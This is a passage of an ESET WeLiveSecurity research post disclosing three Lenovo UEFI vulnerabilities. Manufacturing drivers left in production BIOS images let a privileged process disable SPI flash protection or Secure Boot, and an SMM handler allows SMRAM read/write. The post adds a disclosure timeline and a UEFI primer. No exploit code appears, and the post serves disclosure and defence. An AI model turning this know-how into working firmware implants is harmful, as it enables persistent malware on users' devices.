<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/css/main.css?id=b3e7fe8a6c3736dca145" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Martin Smol√°r',
        'ArticleCategory': 'ESET Research',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });
</script>
<script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>

<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>When &#8220;secure&#8221; isn&#8217;t secure at all: High&#8209;impact UEFI vulnerabilities discovered in Lenovo consumer laptops | WeLiveSecurity</title>
<meta name="description" content="ESET research discovers vulnerabilities in Lenovo consumer laptop models that allow attackers with admin rights to expose users to firmware-level malware."/>
<link rel="canonical" href="https://www.welivesecurity.com/2022/04/19/when-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="pt_BR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="When &#8220;secure&#8221; isn&#8217;t secure at all: High&#8209;impact UEFI vulnerabilities discovered in Lenovo consumer laptops | WeLiveSecurity" />
<meta property="og:description" content="ESET research discovers vulnerabilities in Lenovo consumer laptop models that allow attackers with admin rights to expose users to firmware-level malware." />
<meta property="og:url" content="https://www.welivesecurity.com/2022/04/19/when-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="ESET Research" />
<meta property="article:published_time" content="2022-04-19T09:30:02+00:00" />
<meta property="article:modified_time" content="2022-04-19T16:45:14+00:00" />
<meta property="og:updated_time" content="2022-04-19T16:45:14+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2022/04/uefi-secure-lenovo-laptops-vulnerabilities-research.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2022/04/uefi-secure-lenovo-laptops-vulnerabilities-research.jpg" />
<meta property="og:image:width" content="623" />
<meta property="og:image:height" content="415" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="ESET research discovers vulnerabilities in Lenovo consumer laptop models that allow attackers with admin rights to expose users to firmware-level malware." />
<meta name="twitter:title" content="When &#8220;secure&#8221; isn&#8217;t secure at all: High&#8209;impact UEFI vulnerabilities discovered in Lenovo consumer laptops | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2022/04/uefi-secure-lenovo-laptops-vulnerabilities-research.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-consolas-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/consolas.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/br/2022/04/19/falhas-de-alto-impacto-sao-descobertas-no-uefi-de-notebooks-lenovo/" hreflang="pt" />
<link rel="alternate" href="https://www.welivesecurity.com/2022/04/19/when-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2022/04/19/descubren-vulnerabilidades-severas-uefi-laptops-lenovo/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2022/04/19/verwundbare-uefi-backdoors-in-lenovo-laptops-entdeckt/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">

<script>(window.BOOMR_mq=window.BOOMR_mq||[]).push(["addVar",{"rua.upush":"false","rua.cpush":"false","rua.upre":"false","rua.cpre":"false","rua.uprl":"false","rua.cprl":"false","rua.cprf":"false","rua.trans":"","rua.cook":"false","rua.ims":"false","rua.ufprl":"false","rua.cfprl":"false","rua.isuxp":"false","rua.texp":"norulematch"}]);</script>
                              <script>!function(e){var n="https://s.go-mpulse.net/boomerang/";if("False"=="True")e.BOOMR_config=e.BOOMR_config||{},e.BOOMR_config.PageParams=e.BOOMR_config.PageParams||{},e.BOOMR_config.PageParams.pci=!0,n="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="7R9SM-QGSYF-QDLJK-UETXR-SPM6B",function(){function e(){if(!o){var e=document.createElement("script");e.id="boomr-scr-as",e.src=window.BOOMR.url,e.async=!0,i.parentNode.appendChild(e),o=!0}}function t(e){o=!0;var n,t,a,r,d=document,O=window;if(window.BOOMR.snippetMethod=e?"if":"i",t=function(e,n){var t=d.createElement("script");t.id=n||"boomr-if-as",t.src=window.BOOMR.url,BOOMR_lstart=(new Date).getTime(),e=e||d.body,e.appendChild(t)},!window.addEventListener&&window.attachEvent&&navigator.userAgent.match(/MSIE [67]\./))return window.BOOMR.snippetMethod="s",void t(i.parentNode,"boomr-async");a=document.createElement("IFRAME"),a.src="about:blank",a.title="",a.role="presentation",a.loading="eager",r=(a.frameElement||a).style,r.width=0,r.height=0,r.border=0,r.display="none",i.parentNode.appendChild(a);try{O=a.contentWindow,d=O.document.open()}catch(_){n=document.domain,a.src="javascript:var d=document.open();d.domain='"+n+"';void(0);",O=a.contentWindow,d=O.document.open()}if(n)d._boomrl=function(){this.domain=n,t()},d.write("<bo"+"dy onload='document._boomrl();'>");else if(O._boomrl=function(){t()},O.addEventListener)O.addEventListener("load",O._boomrl,!1);else if(O.attachEvent)O.attachEvent("onload",O._boomrl);d.close()}function a(e){window.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!window.BOOMR||!window.BOOMR.version&&!window.BOOMR.snippetExecuted){window.BOOMR=window.BOOMR||{},window.BOOMR.snippetStart=(new Date).getTime(),window.BOOMR.snippetExecuted=!0,window.BOOMR.snippetVersion=12,window.BOOMR.url=n+"7R9SM-QGSYF-QDLJK-UETXR-SPM6B";var i=document.currentScript||document.getElementsByTagName("script")[0],o=!1,r=document.createElement("link");if(r.relList&&"function"==typeof r.relList.supports&&r.relList.supports("preload")&&"as"in r)window.BOOMR.snippetMethod="p",r.href=window.BOOMR.url,r.rel="preload",r.as="script",r.addEventListener("load",e),r.addEventListener("error",function(){t(!0)}),setTimeout(function(){if(!o)t(!0)},3e3),BOOMR_lstart=(new Date).getTime(),i.parentNode.appendChild(r);else t(!1);if(window.addEventListener)window.addEventListener("load",a,!1);else if(window.attachEvent)window.attachEvent("onload",a)}}(),"".length>0)if(e&&"performance"in e&&e.performance&&"function"==typeof e.performance.setResourceTimingBufferSize)e.performance.setResourceTimingBufferSize();!function(){if(BOOMR=e.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var n=""=="true"?1:0,t="",a="qcw62iqx3vessys66oma-f-87381ae57-clientnsv4-s.akamaihd.net",i="false"=="true"?2:1,o={"ak.v":"32","ak.cp":"1251022","ak.ai":parseInt("757730",10),"ak.ol":"0","ak.cr":16,"ak.ipv":4,"ak.proto":"http/1.1","ak.rid":"b59a989","ak.r":34010,"ak.a2":n,"ak.m":"dscr","ak.n":"ff","ak.bpcip":"128.173.237.0","ak.cport":46196,"ak.gh":"23.221.73.37","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.csrc":"-","ak.acc":"reno","ak.t":"1650389912","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==t0VvH0qT6gcgBRsFY5zguD3Wiof1XkIds6RS1v5Vv2bFw6il32vcMhhEE0y7ws8gjqWZ4ytiPC2meU9/xQ2OOPpsdJ2drpqEOu1faQ0Dd/c3DgEX2uOTdMgkffzADPoRz+wi17mKoBBptsr/9ofaPCF6gD/ffRiw8p1xcy52Mqz/gjK8AFCE4FwEZE75Z3F6oPYFnU9sJ3mlQR4z7l2DANEHbn9ULhugdF877QVAr92qSbdhPWrZ87UBxRMQyuGcDiftFKzFx8IYwAM/a+oErjZjBaoE+FdoWCwIFnDH+mt8vPK9SM0yWSii6aLsgnyVAZ7A5DJ6oV3zb34BzZouztr5zWP5/X9qKkNQ7fBw0+fNos4j0lzWU0baXU1RoE1ytr+y98m2u5Upvaf4cAr2A6q0nszGTYFzupFutQVgTIs=","ak.pv":"11","ak.dpoabenc":"","ak.tf":i};if(""!==t)o["ak.ruds"]=t;var r={i:!1,av:function(n){var t="http.initiator";if(n&&(!n[t]||"spa_hard"===n[t]))o["ak.feo"]=void 0!==e.aFeoApplied?1:0,BOOMR.addVar(o)},rv:function(){var e=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t","ak.tf"];BOOMR.removeVar(e)}};BOOMR.plugins.AK={akVars:o,akDNSPreFetchDomain:a,init:function(){if(!r.i){var e=BOOMR.subscribe;e("before_beacon",r.av,null,null),e("onbeacon",r.rv,null,null),r.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script></head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>

<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/2022/04/19/falhas-de-alto-impacto-sao-descobertas-no-uefi-de-notebooks-lenovo/" title="Em Portugu√™s">
            Em Portugu√™s        </a>
    </li>
        <li>
        <a href="/fr/" title="En fran√ßais">
            En fran√ßais        </a>
    </li>
        <li>
        <a href="/la-es/2022/04/19/descubren-vulnerabilidades-severas-uefi-laptops-lenovo/" title="En Espa√±ol">
            En Espa√±ol        </a>
    </li>
        <li>
        <a href="/deutsch/2022/04/19/verwundbare-uefi-backdoors-in-lenovo-laptops-entdeckt/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="http://welivesecurity.com/category/ukraine-crisis-digital-security-resource-center/">
                                            Ukraine Crisis ‚Äì Digital Security Resource Center                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/we-live-progress/">
                                            We Live Progress                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/2022/04/19/falhas-de-alto-impacto-sao-descobertas-no-uefi-de-notebooks-lenovo/" title="Em Portugu√™s">
            Em Portugu√™s        </a>
    </li>
        <li>
        <a href="/fr/" title="En fran√ßais">
            En fran√ßais        </a>
    </li>
        <li>
        <a href="/la-es/2022/04/19/descubren-vulnerabilidades-severas-uefi-laptops-lenovo/" title="En Espa√±ol">
            En Espa√±ol        </a>
    </li>
        <li>
        <a href="/deutsch/2022/04/19/verwundbare-uefi-backdoors-in-lenovo-laptops-entdeckt/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong>					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2022/04/uefi-secure-lenovo-laptops-vulnerabilities.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>When &#8220;secure&#8221; isn&#8217;t secure at all: High&#8209;impact UEFI vulnerabilities discovered in Lenovo consumer laptops</h1>
<div class="excerpt">ESET researchers discover multiple vulnerabilities in various Lenovo laptop models that allow an attacker with admin privileges to expose the user to firmware-level malware</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/msmolar/" title="Martin Smol√°r">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2020/05/martin.smolar-1-222x179.jpg" alt="Martin Smol√°r">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/msmolar/" title="Martin Smol√°r">
                    Martin Smol√°r                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2022-04-19 11:30:02">19 Apr 2022 - 11:30AM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2022%2F04%2F19%2Fwhen-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2022%2F04%2F19%2Fwhen-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops%2F&text=When &#8220;secure&#8221; isn&#8217;t secure at all: High&#8209;impact UEFI vulnerabilities discovered in Lenovo consumer laptops%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2022%2F04%2F19%2Fwhen-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>ESET researchers discover multiple vulnerabilities in various Lenovo laptop models that allow an attacker with admin privileges to expose the user to firmware-level malware</p>
                            </div>

                            <p>ESET researchers have discovered and analyzed three vulnerabilities affecting various Lenovo consumer laptop models. The first two of these vulnerabilities ‚Äì <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3971" target="_blank" rel="noopener"><em>CVE-2021-3971</em></a>, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3972" target="_blank" rel="noopener"><em>CVE-2021-3972</em></a> ‚Äì affect UEFI firmware drivers originally meant to be used only during the manufacturing process of Lenovo consumer notebooks. Unfortunately, they were mistakenly included also in the production BIOS images without being properly deactivated. These affected firmware drivers can be activated by attacker to directly disable SPI flash protections (BIOS Control Register bits and Protected Range registers) or the UEFI Secure Boot feature from a privileged user-mode process during OS runtime. It means that exploitation of these vulnerabilities would allow attackers to deploy and successfully execute SPI flash or ESP implants, like <a href="https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf" target="_blank" rel="noopener"><em>LoJax</em></a> or our latest UEFI malware discovery <a href="https://www.welivesecurity.com/2021/10/05/uefi-threats-moving-esp-introducing-especter-bootkit/" target="_blank" rel="noopener"><em>ESPecter</em></a>, on the affected devices.</p>
<p>To understand how we were able to find these vulnerabilities, consider the firmware drivers affected by <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3971" target="_blank" rel="noopener"><em>CVE‚Äë2021-3971</em></a>. These drivers immediately caught our attention by their very unfortunate (but surprisingly honest) names: <span style="font-family: 'courier new', courier, monospace;">SecureBackDoor</span> and <span style="font-family: 'courier new', courier, monospace;">SecureBackDoorPeim</span>. After some initial analysis, we discovered other Lenovo drivers sharing a few common characteristics with the <span style="font-family: 'courier new', courier, monospace;">SecureBackDoor*</span> drivers: <span style="font-family: 'courier new', courier, monospace;">ChgBootDxeHook</span> and <span style="font-family: 'courier new', courier, monospace;">ChgBootSmm</span>. As it turned out, their functionality was even more interesting and could be abused to disable UEFI Secure Boot (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3972" target="_blank" rel="noopener"><em>CVE-2021-3972</em></a>).</p>
<p>In addition, while investigating above mentioned vulnerable drivers, we discovered the third vulnerability: SMM memory corruption inside the SW SMI handler function (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3970" target="_blank" rel="noopener"><em>CVE-2021-3970</em></a>). This vulnerability allows arbitrary read/write from/into SMRAM, which can lead to the execution of malicious code with SMM privileges and potentially lead to the deployment of an SPI flash implant.</p>
<p>We reported all discovered vulnerabilities to Lenovo on October 11<sup>th</sup>, 2021. Altogether, the list of affected devices contains more than one hundred different consumer laptop models with millions of users worldwide, from affordable models like <strong>Ideapad-3</strong> to more advanced ones like <strong>Legion 5 Pro-16ACH6 H</strong> or <strong>Yoga Slim 9-14ITL05</strong>. The full list of affected models with active development support is published in the <a href="https://support.lenovo.com/us/en/product_security/LEN-73440" target="_blank" rel="noopener"><em>Lenovo Advisory</em></a>.</p>
<p>In addition to the models listed in the advisory, several other devices we reported to Lenovo are also affected, but won‚Äôt be fixed due to them reaching End Of Development Support (EODS). This includes devices where we spotted reported vulnerabilities for the first time: Ideapad 330-15IGM and Ideapad 110-15IGR. The list of such EODS devices that we have been able to identify will be available in <a href="https://github.com/eset/vulnerability-disclosures/" target="_blank" rel="noopener"><em>ESET‚Äôs vulnerability disclosures repository</em></a>.</p>
<p>Lenovo confirmed the vulnerabilities on November 17<sup>th</sup>, 2021, and assigned them the following CVEs:</p>
<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3970" target="_blank" rel="noopener"><em>CVE-2021-3970</em></a> <span style="font-family: 'courier new', courier, monospace;">LenovoVariableSmm</span> ‚Äì SMM arbitrary read/write</li>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3971" target="_blank" rel="noopener"><em>CVE-2021-3971</em></a> <span style="font-family: 'courier new', courier, monospace;">SecureBackDoor</span> ‚Äì disable SPI flash protections</li>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3972" target="_blank" rel="noopener"><em>CVE-2021-3972</em></a> <span style="font-family: 'courier new', courier, monospace;">ChgBootDxeHook</span> ‚Äì disable UEFI Secure Boot</li>
</ul>
<p>Vulnerability disclosure timeline:</p>
<ul>
<li>2021-10-11: Vulnerabilities reported to Lenovo</li>
<li>2021-10-12: Lenovo responded and confirmed it was investigating the issues</li>
<li>2021-11-17: Lenovo confirmed the vulnerabilities and informed us of the planned advisory publication date ‚Äì February 8<sup>th</sup>, 2022</li>
<li>2022-01-20: Lenovo asked to postpone public disclosure to the new date ‚Äì April 18<sup>th</sup> ‚Äì due to encountering development issues</li>
<li>2022-04-18: Lenovo security advisory published</li>
<li>2022-04-19: ESET Research blogpost published</li>
</ul>
<hr />
<h2></h2>
<h2>UEFI firmware theoretical basics</h2>
<p>Before we start with the analysis of the reported vulnerabilities, we would like to provide an introduction to the basic theory of UEFI protocols, System Management Mode, UEFI NVRAM variables, UEFI Secure Boot, and basic SPI flash write protection.</p>
<p>Note that our aim is to explain only the necessary minimum required for an understanding of the analysis of the vulnerabilities reported here. For those who are already familiar with these topics, we suggest jumping directly to the <em>Technical analysis</em> section. For those who consider this introduction insufficient, we highly recommend looking into the <a href="https://www.sentinelone.com/labs/moving-from-common-sense-knowledge-about-uefi-to-actually-dumping-uefi-firmware/" target="_blank" rel="noopener"><em>series of blogposts written by researchers from SentinelOne</em></a> and the <a href="https://uefi.org/specifications" target="_blank" rel="noopener"><em>UEFI Specification</em></a>.</p>
<h3>UEFI services and protocols</h3>
<p>UEFI defines two types of services to be used by UEFI drivers and applications &#8211; Boot (<span style="font-family: 'courier new', courier, monospace;">EFI_BOOT_SERVICES</span>) and Runtime (<span style="font-family: 'courier new', courier, monospace;">EFI_RUNTIME_SERVICES</span>) services. Both are passed to the driver‚Äôs or application‚Äôs entry point via the <span style="font-family: 'courier new', courier, monospace;">EFI_SYSTEM_TABLE</span> argument.</p>
<p>They provide the basic functions and data structures necessary for the drivers and applications to do their job, such as installing protocols, locating existing protocols, memory allocation, UEFI variable manipulation, etc.</p>
<p>UEFI boot drivers and applications use protocols extensively. In the context of UEFI, protocols are simply groups of functions identified by a GUID. These protocols, once installed, reside in memory and can be used by other drivers or applications, until <span style="font-family: 'courier new', courier, monospace;">EFI_BOOT_SERVICES.ExitBootServices</span> is called. The UEFI specification defines many such protocols to cover the most common firmware use-case scenarios, but firmware developers are still able to define their own protocols to extend this basic functionality.</p>
<h3>UEFI variables</h3>
<p>UEFI variables are a special firmware storage mechanism used by UEFI modules to store various configuration data, including boot configuration, UEFI Secure Boot settings, certificates, and similar data. These variables are always identified by a <strong>variable name</strong> and a <strong>namespace (GUID)</strong>.</p>
<p>When creating a UEFI variable, attributes are used to indicate how the variable should be stored and maintained by the system ‚Äì this way one can make variables persistent (surviving power cycles), temporary, or even authenticated. Authenticated in the context of the NVRAM variables means that the variable content can be changed only if the new variable data is correctly signed by the authorized private key ‚Äì read access to the variable is allowed to anyone.</p>
<p>Examples of some of these attributes follow; here we list only the most important ones:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">VARIABLE_ATTRIBUTE_NON_VOLATILE</span> (NV)<em>(0x00000001)</em><br />
Variables using this attribute persist across the power cycles and are stored in fixed hardware storage (NVRAM) with limited capacity (typically around 64MB).</li>
<li><span style="font-family: 'courier new', courier, monospace;">VARIABLE_ATTRIBUTE_BOOTSERVICE_ACCESS (BS)</span><em>(0x00000002)</em><br />
If the BS attribute is set, variables without the <span style="font-family: 'courier new', courier, monospace;">RT</span> attribute set will not be visible to the <span style="font-family: 'courier new', courier, monospace;">GetVariable</span> function after the execution of <span style="font-family: 'courier new', courier, monospace;">EFI_BOOT_SERVICES.ExitBootServices</span>.</li>
<li><span style="font-family: 'courier new', courier, monospace;">VARIABLE_ATTRIBUTE_RUNTIME_ACCESS (RT)</span><em>0x00000004)¬†</em><br />
To access a variable via the <span style="font-family: 'courier new', courier, monospace;">GetVariable</span> function after the execution of <span style="font-family: 'courier new', courier, monospace;">EFI_BOOT_SERVICES.ExitBootServices</span>, the <span style="font-family: 'courier new', courier, monospace;">RT</span> attribute must be set.</li>
<li><span style="font-family: 'courier new', courier, monospace;">VARIABLE_ATTRIBUTE_AUTHENTICATED_WRITE_ACCESS (AW)</span><em>(0x00000010)</em></li>
<li><span style="font-family: 'courier new', courier, monospace;">VARIABLE_ATTRIBUTE_TIME_BASED_AUTHENTICATED_WRITE_ACCESS (AWT)</span><em>(0x00000020)</em></li>
</ul>
<p>A full list of attributes and their usage rules can be found in the <a href="https://uefi.org/sites/default/files/resources/UEFI_Spec_2_9_2021_03_18.pdf" target="_blank" rel="noopener"><em>UEFI specification</em></a>.</p>
<p>It‚Äôs important to note that since Windows 8 an API allows access to UEFI variables from a privileged userland process (administrator with <a href="https://docs.microsoft.com/en-us/windows/desktop/SecAuthZ/privilege-constants" target="_blank" rel="noopener"><em>SE_SYSTEM_ENVIRONMENT_NAME</em></a> privilege).These API functions are:</p>
<ul>
